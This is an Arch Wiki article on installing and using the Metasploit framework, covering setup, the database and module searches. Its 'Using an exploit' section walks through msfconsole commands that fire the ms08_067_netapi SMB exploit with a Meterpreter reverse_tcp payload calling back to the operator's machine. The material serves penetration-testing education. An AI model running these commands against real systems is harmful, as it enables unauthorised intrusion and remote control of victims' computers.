{
  "title": "Msf",
  "url": "https://wiki.archlinux.org/title/Msf",
  "sections": [
    {
      "title": "Introduction",
      "level": 1,
      "content": "Note: **This article or section needs expansion.** This article or section needs expansion.\n\nThis article or section needs expansion.\n\nFrom the official site:\n\nCurrently, Metasploit requires to setup and configure PostgreSQL on target system to work. This wiki will show how to get Metasploit working with a PostgreSQL database.\n\n"
    },
    {
      "title": "Installation",
      "level": 2,
      "content": "Install package metasploit. It is optional to follow the RVM setup instructions below. For latest development version, install metasploit-gitAUR instead.\n\n"
    },
    {
      "title": "Armitage",
      "level": 3,
      "content": "Armitage is a GUI front end for Metasploit written in Java; it can be installed with the armitage-gitAUR package.\n\nWhen running Armitage, #Setting up the database is not optional, and must be followed. It is also mandatory to use a ~/.msf4/database.yml file.\n\nA sample database.yml file is packaged with Armitage as /usr/share/metasploit/database.yml.sample.\n\n"
    },
    {
      "title": "RVM",
      "level": 3,
      "content": "Msfconsole requires Ruby and some Ruby#RubyGems to run without error.\n\nFollow the RVM#Installation and RVM#Using RVM articles to install and use Ruby version 3.1.5 (see Metasploit Git Repo) and set it to default.\n\nOnce complete, source the newly created RVM installation:\n\n```\n$ source ~/.rvm/scripts/rvm\n```\n\nNow cd into /opt/metasploit and use Ruby#Bundler to install all gems necessary to run Msfconsole:\n\n```\n$ gem install bundler\n$ bundle install\n```\n\n"
    },
    {
      "title": "Setting up the database",
      "level": 2,
      "content": "Metasploit can be used without a database, but cache operations like searching would be very slow. This section shows how to set up Metasploit with Postgresql database server.\n\nFollow the PostgreSQL article to setup / start the service. Once the service is started and running, run :\n\n```\nmsfdb init --connection-string=postgresql://postgres@localhost:5432/postgres\n```\n\nThe database should now be properly initialized, and the connection should be automatically established when running msfconsole.\n\nRun db_status to verify that database connection is properly established:\n\n```\nmsf > db_status\n```\n\n```\n[*] postgresql connected to msf\n```\n\n"
    },
    {
      "title": "Usage",
      "level": 2,
      "content": "There are several interfaces available for Metasploit. This section will explain how to use msfconsole, the interface that provides the most features available in MSF.\n\nTo start it, simply type msfconsole. The prompt will change to msf > to indicate it is waiting for commands.\n\n"
    },
    {
      "title": "Module types",
      "level": 3,
      "content": "Everything (scripts, files, programs etc) in Metasploit is a module. There are 6 types of modules:\n\n- auxiliary - Modules for helping the attacker in various tasks, like port scanning, version detection or network traffic analysis\n- exploit - The code that takes advantage of a vulnerability and allows the execution of the payload, like triggering buffer overflow or bypassing authentication\n- payload - The thing that has to be done right after a successful exploit, like establishing a remote connection, starting a meterpreter session or executing some shell commands\n- post - Various programs that can be run after successful exploitation and remote connection, like collecting passwords, setting up keyloggers or downloading files\n- encoder - Programs for performing encryption\n- nop - NOP generators. NOP is an assembly language instruction which simply does nothing. The machine code of this instruction is different on each hardware architecture. NOP instructions are useful for filling the void in executables.\n\n"
    },
    {
      "title": "Searching for exploits",
      "level": 3,
      "content": "To discover what operating system and software version a target runs, perform a port scan. With this information, use the search command to search for available exploits.\n\nTo search for all exploits targeting Novell on the Linux platform:\n\n```\nmsf > search platform:linux type:exploit name:Novell\n```\n\nTo search for all exploits on the Linux platform containing the keyword Apache and filter the results with grep:\n\n```\nmsf > grep RCE search platform:linux type:exploit Apache\n```\n\nTo search for specific field, type its name, followed by column and the phrase. The following search fields are available:\n\nTable content:\nSearch field | Matches | Possible values | DB table & column\napp | Passive (client) or Active (server) exploits | client, server | module_details.stance\nauthor | Name and email of module Author | Any phrase | module_authors.name\ntype | The module type | auxiliary, exploit, payload, post, encoder, nop | module_details.mtype\nname | The path (Name) and the short description | Any phrase | module_details.fullname, module_details.name\nplatform | The target hardware or software platform | bsdi, netware, linux, hpux, irix, osx, bsd, platform, java, javascript, unix, php, firefox, nodejs, ruby, cisco, android, aix, windows, python, solaris | module_platforms.name\nbid, cve, edb, osvdb or ref | The Bugtraq[dead link 2023-05-07 â“˜], CVE, Exploit-DB, OSBDB ID or any | Exploit database entry ID, or a part of upstream report URL | module_refs.name\n(No field) | All of the above except app and type | Any phrase | All of the above\n\nSee #Searching from the database and #Database search examples for more advanced search queries.\n\n"
    },
    {
      "title": "Using an exploit",
      "level": 3,
      "content": "After choosing an appropriate exploit, it is time to start hacking!\n\nFirst, select an exploit using the use command:\n\n```\nmsf > use exploit/windows/smb/ms08_067_netapi\n```\n\nTo view information about a module, use the info command:\n\n```\nmsf exploit(ms08_067_netapi) > info exploit/windows/smb/ms08_067_netapi\n```\n\nRunning info without arguments will show info about currently selected module.\n\nTo view the selected exploit's options, run:\n\n```\nmsf exploit(ms08_067_netapi) > show options\n```\n\n```\nModule options (exploit/windows/smb/ms08_067_netapi):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOST                     yes       The target address\n   RPORT    445              yes       Set the SMB service port\n   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)\n\n   ...\n```\n\nAll the required fields must be provided before exploitation. Here, only the RHOST variable must be specified. To assign a value to a variable use the set command:\n\n```\nmsf exploit(ms08_067_netapi) > set RHOST 192.168.56.102\n```\n\nNow choose the payload:\n\n```\nmsf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp\n```\n\nChoosing a payload (actually, choosing modules in general) will add more options. Run show options again:\n\n```\nmsf exploit(ms08_067_netapi) > show options\n```\n\n```\nModule options (exploit/windows/smb/ms08_067_netapi):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOST    192.168.56.102   yes       The target address\n   RPORT    445              yes       Set the SMB service port\n   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (accepted: seh, thread, process, none)\n   LHOST                      yes       The listen address\n   LPORT     4444             yes       The listen port\n```\n\nNow assign LHOST variable to the address of your computer, where the exploited computer will send connection requests to:\n\n```\nmsf exploit(ms08_067_netapi) > set LHOST 192.168.56.1\n```\n\nNow launch the attack!\n\n```\nmsf exploit(ms08_067_netapi) > exploit\n```\n\nIf you are lucky, you will be dropped to a Meterpreter session where you can do anything on the remote computer.\n\n"
    },
    {
      "title": "Searching from the database",
      "level": 3,
      "content": "Since everything in Metasploit is stored in a database, it is easy to make powerful search queries without the need of the search frontend command.\n\nTo start the database interface, run:\n\n```\n$ psql msf\n```\n\nThe information about modules is stored in 8 tables:\n\nTable content:\nTable Name | Contents\nmodule_details | The \"main\" table, describes various details of each module\nmodule_actions | The action names of auxiliary modules\nmodule_archs | The target hardware architecture or software platform\nmodule_authors | Names and emails of module author\nmodule_mixins | Empty (???)\nmodule_platforms | The target operating system. See also #Popularity of a platform by number of exploits\nmodule_refs | References to various online exploit databases and reports\nmodule_targets | The target program name and version of the exploit\n\nAlmost all tables have 3 columns: id, detail_id and name, except for module_details table which has 16 columns.\n\nThe detail_id values are pointers to the rows of module_details table.\n\nTo see the all the contents of a table, run:\n\n```\nSELECT * FROM table_name;\n```\n\nMultiple:\n\n- Architecture\n- Platform\n- Target\n\nModule options:\n\n- module type\n- stance\n- privileged\n- path\n- name\n- refname\n- rank\n- privileged\n- disclosure date\n\n"
    },
    {
      "title": "Database search examples",
      "level": 3,
      "content": "The module_details table contains multiple columns and viewing them all at once is not convenient. To show only basic information about the modules:\n\n```\nSELECT id, mtype, refname, disclosure_date, rank, stance, name\nFROM module_details;\n```\n\nShow some information about available modules, include platform information from module_platforms:\n\n```\nSELECT module_details.id, mtype, module_platforms.name as platform, refname, DATE(disclosure_date), rank, module_details.name\nFROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id;\n```\n\nShow all client (aggressive) exploits for Windows platform:\n\n```\nSELECT module_details.id, mtype, module_platforms.name as platform, refname, DATE(disclosure_date), rank, module_details.name\nFROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id\nWHERE module_platforms.name = 'windows'\nAND mtype = 'exploit'\nAND stance = 'aggressive';\n```\n\nShow all exploits for Windows platform with rank >= 500 disclosed after 2013:\n\n```\nSELECT module_details.id, mtype, module_platforms.name as platform, refname, DATE(disclosure_date), rank, module_details.name\nFROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id\nWHERE module_platforms.name = 'windows'\nAND mtype = 'exploit'\nAND rank >= 500\nAND disclosure_date >= TIMESTAMP '2013-1-1';\n```\n\nShow all aggressive (client) exploits for Windows platform with rank >= 500 and include additional information about module's target:\n\n```\nSELECT module_details.id, mtype, module_platforms.name as platform, module_details.name, DATE(disclosure_date), rank, module_targets.name as target\nFROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id JOIN module_targets on module_details.id = module_targets.detail_id\nWHERE module_platforms.name = 'windows'\nAND mtype = 'exploit'\nAND stance = 'aggressive'\nAND rank >= 500\norder by target;\n```\n\n"
    },
    {
      "title": "Popularity of a platform by number of exploits",
      "level": 3,
      "content": "To view the possible platform values, and number of available exploits, run from psql:\n\n```\nSELECT name, count(*)\nFROM module_platforms\nGROUP BY name\nORDER BY count DESC;\n```\n\n"
    },
    {
      "title": "Disable the ASCII banner on startup",
      "level": 3,
      "content": "To disable the banner, run msfconsole with -q/--quiet argument:\n\n```\n$ msfconsole --quiet\n```\n\n"
    },
    {
      "title": "Preserve variable values between sessions",
      "level": 3,
      "content": "If you do not want the variables to reset when selecting another module and when rerunning msfconsole then set it globally via setg, for example:\n\n```\nmsf > setg RHOST 192.168.56.102\n```\n\n"
    },
    {
      "title": "Cannot click in VNC viewer",
      "level": 3,
      "content": "If you selected VNC viewer as a payload, but are unable to click or do any actions, that means you forgot to set the ViewOnly variable to false. To fix this problem, re-run the exploit with the variable set to false:\n\n```\nmsf > set ViewOnly false\n```\n\n"
    },
    {
      "title": "cannot load such file -- robots (LoadError)",
      "level": 3,
      "content": "If you get an error like this:\n\n```\n~/metasploit-framework/lib/metasploit/framework.rb:19:in `require': cannot load such file -- robots (LoadError)\n    from ~/metasploit-framework/lib/metasploit/framework.rb:19:in `<top (required)>'\n    from ~/metasploit-framework/lib/metasploit/framework/database.rb:1:in `require'\n    from ~/metasploit-framework/lib/metasploit/framework/database.rb:1:in `<top (required)>'\n    from ~/metasploit-framework/lib/metasploit/framework/parsed_options/base.rb:17:in `require'\n    from ~/metasploit-framework/lib/metasploit/framework/parsed_options/base.rb:17:in `<top (required)>'\n    from ~/metasploit-framework/lib/metasploit/framework/parsed_options/console.rb:2:in `<top (required)>'\n    from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:230:in `const_get'\n    from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:230:in `block in constantize'\n    from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:229:in `each'\n    from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:229:in `constantize'\n    from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/core_ext/string/inflections.rb:54:in `constantize'\n    from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:73:in `parsed_options_class'\n    from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:69:in `parsed_options'\n    from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:47:in `require_environment!'\n    from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:81:in `start'\n    from ./msfconsole:48:in `<main>'\n```\n\nThis happens because the file robots.rb has incorrect permissions and can be read only by the root user (see the bug report):\n\n```\n$ ls -l /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/robots-0.10.1/lib\n```\n\n```\ntotal 4\n-rw-r----- 1 root root 3174 Oct 19 16:47 robots.rb\n```\n\nTo fix this, simply change the permission to be world-readable:\n\n```\n# chmod o+r /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/robots-0.10.1/lib/robots.rb\n```\n\n"
    },
    {
      "title": "db_connect fails silently",
      "level": 3,
      "content": "If upon running db_connect you see no output, but later getting a message like this:\n\n```\n[!] Database not connected or cache not built, using slow search\n```\n\nthat probably means that the postgresql service is not running.\n\n"
    },
    {
      "title": "See also",
      "level": 2,
      "content": "- Metasploit Unleashed security training\n- GitHub wiki\n- Wikibooks\n- Wikipedia\n\n"
    }
  ]
}